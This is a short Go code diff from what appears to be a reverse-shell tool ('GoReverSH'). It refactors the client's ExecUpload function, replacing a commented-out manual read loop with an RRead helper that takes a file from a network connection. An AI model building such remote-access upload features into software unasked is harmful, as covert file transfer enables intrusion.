@@ -3,7 +3,6 @@ package pkgclient
 import (
 	"GoReverSH/config"
 	"encoding/base64"
-	"io"
 	"log"
 	"net"
 	"os"
@@ -24,31 +23,39 @@ func ExecUpload(fileName string, conn net.Conn) error {
 		}
 	}
 
-	//read
-	//最終的な入れ物
-	var content []byte
-	//読み込むもの
-	buf := make([]byte, 1024)
-	//読み込む位置
-	size := 0
+	/*
+		//read
+		//最終的な入れ物
+		var content []byte
+		//読み込むもの
+		buf := make([]byte, 1024)
+		//読み込む位置
+		size := 0
 
-	for {
-		//ファイルを読み込む
-		n, err := conn.Read(buf)
-		if err != nil {
-			if n == 0 || err == io.EOF {
+		for {
+			//ファイルを読み込む
+			n, err := conn.Read(buf)
+			if err != nil {
+				if n == 0 || err == io.EOF {
+					break
+				}
 				break
 			}
-			break
+			//content + bufの中身を一時的に保存。
+			tmp := make([]byte, 0, size+n)
+			tmp = append(content[:size], buf[:n]...)
+			content = tmp
+			size += n
+			if n < 1024 {
+				break
+			}
 		}
-		//content + bufの中身を一時的に保存。
-		tmp := make([]byte, 0, size+n)
-		tmp = append(content[:size], buf[:n]...)
-		content = tmp
-		size += n
-		if n < 1024 {
-			break
-		}
+	*/
+
+	content, err := RRead(conn)
+	if err != nil {
+		log.Println(err)
+		return err
 	}
 
 	//save
